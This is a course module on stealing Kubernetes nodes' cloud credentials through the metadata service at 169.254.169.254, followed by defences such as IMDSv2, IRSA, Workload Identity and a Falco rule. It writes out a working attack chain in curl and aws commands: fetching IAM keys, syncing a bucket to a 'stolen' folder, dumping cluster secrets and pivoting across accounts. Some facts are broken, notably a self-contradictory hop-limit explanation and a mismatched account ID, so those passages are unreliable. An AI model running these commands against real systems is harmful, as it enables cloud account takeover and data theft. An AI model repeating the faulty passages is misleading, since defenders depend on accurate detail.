# Cloud IAM & Metadata Service Attacks — Stealing the Node's Cloud Credentials

> **Module 05 · Course 38** — Your pod is in a Kubernetes cluster running on AWS, GCP, or Azure. The node it runs on has an IAM role attached. That role lets the node call cloud APIs. And there's a special IP address — `169.254.169.254` — that any process on the node (including your pod) can reach to get those cloud credentials. No authentication required. This module covers how attackers exploit the Instance Metadata Service, what real-world permissions are at stake, and how to shut it down.

---

## The Instance Metadata Service (IMDS)

Cloud providers give every VM a metadata server reachable at `169.254.169.254`. It's a link-local IP — it only works from within the VM itself (or from containers on that VM). It returns:

- Instance identity (instance ID, region, availability zone)
- Network configuration (local IP, public IP, VPC)
- **IAM credentials for the attached IAM role / service account** ← the prize

```
AWS EC2 Node
├── IAM Role: eks-node-role
│   ├── ec2:Describe*
│   ├── s3:GetObject on company-backup-bucket
│   ├── ecr:GetAuthorizationToken
│   └── eks:DescribeCluster (sometimes!)
│
└── IMDS at 169.254.169.254
    └── /latest/meta-data/iam/security-credentials/eks-node-role
        ├── AccessKeyId: ASIAREDTEAM...
        ├── SecretAccessKey: (live AWS credential)
        └── Token: (STS session token)

Any pod on this node can curl that endpoint.
No network policy blocks 169.254.169.254 by default.
No pod-level authentication required.
```

---

## IMDS v1 — The Vulnerable Version

IMDS v1 is a simple HTTP GET API. No authentication, no token required:

```bash
# From inside a pod on an AWS EKS cluster (without IMDSv2 enforcement):

# Step 1: Check if IMDS is reachable
curl -s http://169.254.169.254/latest/meta-data/

# Output:
# ami-id
# ami-launch-index
# hostname
# iam/
# instance-id
# instance-type
# local-ipv4
# ...

# Step 2: Discover the attached IAM role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Output: eks-node-role

# Step 3: Get the actual credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role
```

Output:
```json
{
  "Code": "Success",
  "LastUpdated": "2026-11-25T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAREALAWSKEY12345",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEDUaDCo...==",
  "Expiration": "2026-11-25T16:00:00Z"
}
```

**Three lines of curl. That's all it takes.**

---

## What an Attacker Does with These Credentials

```bash
# Export the stolen credentials
export AWS_ACCESS_KEY_ID="ASIAREALAWSKEY12345"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEDUaD..."

# Now call AWS APIs from their own machine (outside the cluster!)
aws sts get-caller-identity
# Returns the IAM role identity — confirms credentials work

# Enumerate permissions
aws iam list-attached-role-policies --role-name eks-node-role

# Common EKS node role permissions attackers exploit:
aws ec2 describe-instances --region ap-south-1          # Map all EC2 instances
aws s3 ls s3://company-backup-bucket                     # List backup bucket
aws ecr get-login-password | docker login ...            # Pull private container images
aws eks describe-cluster --name production               # Get K8s API endpoint + CA cert
aws ssm describe-instance-information                    # Find SSM-connected servers

# If the role has s3:GetObject — data exfiltration:
aws s3 sync s3://company-backup-bucket /tmp/stolen/ --no-sign-request 2>/dev/null
```

**The critical escalation:**

```bash
# EKS nodes sometimes have this permission (or it's derivable):
aws eks get-token --cluster-name production
# Returns a K8s bearer token for the CLUSTER

# Combined with the cluster endpoint from describe-cluster:
aws eks update-kubeconfig --name production
kubectl get secrets --all-namespaces
# Full cluster access from a stolen node IAM role
```

---

## IMDS v2 — The Mitigation

AWS introduced IMDSv2 as the fix. Instead of a plain GET, v2 requires a session-token exchange first:

```bash
# IMDSv2 flow:
# Step 1: PUT request to get a session token (TTL = how long it's valid)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Returns a token like: gQr1nA7...

# Step 2: Use the token in GET requests
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

**The key protection: hop limit.**

The session token PUT request has a TTL *and* a hop limit. If you set `HttpPutResponseHopLimit: 1`, the PUT response (with the session token) can only travel 1 network hop. A container is 1 hop away from the host. So the token is delivered — the container can use IMDSv2.

BUT if you set `HttpPutResponseHopLimit: 2`, the PUT response can travel 2 hops — and the hop limit on the response decreases by 1 each time. So:

```
EC2 node (hop 1 router)
└── container (hop 2)
    └── If hop limit = 1, PUT response does not reach the container
        If hop limit = 2, PUT response DOES reach the container

Recommended: hop limit = 1
Then: EC2 node itself can use IMDSv2 (1 hop away = itself)
But containers cannot (would need hop limit = 2 to work)
```

This is what makes IMDSv2 + hop limit = 1 an effective mitigation.

---

## IAM Roles for Service Accounts (IRSA)

The proper fix isn't just hardening IMDS — it's using pod-level identity instead of node-level identity.

**Node-level IAM role (bad):**

```
EKS Node → IAM Role: eks-node-role → permissions apply to ALL pods on that node
                                      Any pod can steal any other pod's cloud access
```

**IRSA (IAM Roles for Service Accounts):**

```
Pod A (SA: payments-sa) → annotated → IAM Role: payments-iam-role
                                       permissions: s3:GetObject on payments-bucket
                                       ONLY this pod gets this role

Pod B (SA: frontend-sa) → annotated → IAM Role: frontend-iam-role
                                       permissions: cloudwatch:PutMetricData
                                       ONLY this pod gets this role
```

**How IRSA works:**

1. OIDC provider is configured for the EKS cluster
2. Each SA is annotated with an IAM role ARN
3. When the pod starts, AWS injects temporary credentials via a projected service account token
4. The token is verified by OIDC → IAM assumes the role → credentials in env vars

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payments-sa
  namespace: payments
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/payments-iam-role
```

```bash
# In the pod, the credentials appear as env vars injected by the AWS SDK:
env | grep AWS
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/payments-iam-role
# AWS_DEFAULT_REGION=ap-south-1
```

**Security gain:** A compromised pod can only access its own IRSA role's permissions — not the entire node's permissions. If the IMDS is still accessible but only returns restricted credentials tied to the SA's role, the blast radius is limited.

---

## GCP Equivalent: Workload Identity Federation

GCP's equivalent to IRSA:

```bash
# GKE metadata server at 169.254.169.254 (or metadata.google.internal)
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# GKE's fix: Workload Identity
# Annotate K8s SA with GCP service account
kubectl annotate serviceaccount payments-sa \
  --namespace payments \
  iam.gke.io/gcp-service-account=payments@myproject.iam.gserviceaccount.com
```

---

## Azure: Instance Metadata and Managed Identity

```bash
# Azure IMDS endpoint
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed Identity credentials
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns access_token for Azure Resource Manager API
```

---

## Cross-Account Attacks

A stolen IAM role can sometimes pivot to OTHER AWS accounts via AssumeRole:

```bash
# Check if the stolen role can assume roles in other accounts
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456:role/eks-node-role \
  --action-names sts:AssumeRole \
  --resource-arns "arn:aws:iam::987654:role/cross-account-role"

# If yes:
aws sts assume-role \
  --role-arn arn:aws:iam::987654654:role/cross-account-role \
  --role-session-name "attacker-session"
# Now you have credentials in the TARGET account
```

**Resource-based policy attack:**

An S3 bucket in account B with a resource-based policy that allows account A's role:

```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123456:role/eks-node-role"},
  "Action": "s3:*",
  "Resource": "arn:aws:s3:::company-data-bucket/*"
}
```

If you compromise the eks-node-role in account A, you can read that bucket in account B — even though you have no credentials in account B.

---

## Full Defense Checklist

```
1. Enforce IMDSv2 + hop limit 1
   AWS: set HttpTokens=required, HttpPutResponseHopLimit=1 on node group launch template

2. NetworkPolicy egress block
   Block pods from reaching 169.254.169.254/32
   (see solution.md of challenge 01 for exact YAML)

3. Use IRSA / Workload Identity / Managed Identity
   Per-SA IAM roles, not node-level roles

4. Least-privilege node IAM role
   Node role needs: ec2:DescribeInstances, ecr:GetAuthorizationToken, logs:*
   Remove: s3:*, ec2:*, ssm:*, iam:*

5. Monitor for IMDS access patterns
   CloudTrail: alert on AssumeRole calls from EC2 instance profiles at unusual times
   GuardDuty: auto-detects credential exfiltration patterns

6. Falco rule for IMDS access:
   - condition: evt.type = connect and fd.sip = "169.254.169.254"
   - priority: WARNING
   - output: "IMDS access from container %container.name%"
```

---

## Checkpoint

1. What is the IMDS and what IP address is it always reachable at?
2. What three values does the IMDS credential response return that allow AWS API calls?
3. What is the difference between IMDSv1 and IMDSv2?
4. What is the `HttpPutResponseHopLimit` and why is setting it to 1 effective?
5. What is IRSA and how does it limit the blast radius of a compromised pod vs a node-level IAM role?
6. How does the OIDC-based token verification work in IRSA?
7. What AWS permissions on a typical EKS node role would an attacker most want to exploit?
8. How does a cross-account AssumeRole attack work, and what does it require?
9. Write a NetworkPolicy egress rule that blocks pods from reaching 169.254.169.254/32.
10. If IMDS is blocked by NetworkPolicy, but the node IAM role is still over-privileged, what's the remaining risk?

➡ Next: **Runtime Detection with Falco** — attacker behavior leaves traces in syscalls; Falco watches every one.
